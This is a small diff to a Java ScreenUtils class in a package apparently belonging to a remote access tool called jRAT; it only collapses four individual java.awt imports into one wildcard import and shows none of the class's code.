@@ -1,9 +1,6 @@
 package jrat.client.utils;
 
-import java.awt.AWTException;
-import java.awt.GraphicsDevice;
-import java.awt.GraphicsEnvironment;
-import java.awt.Robot;
+import java.awt.*;
 
 public class ScreenUtils {
 	
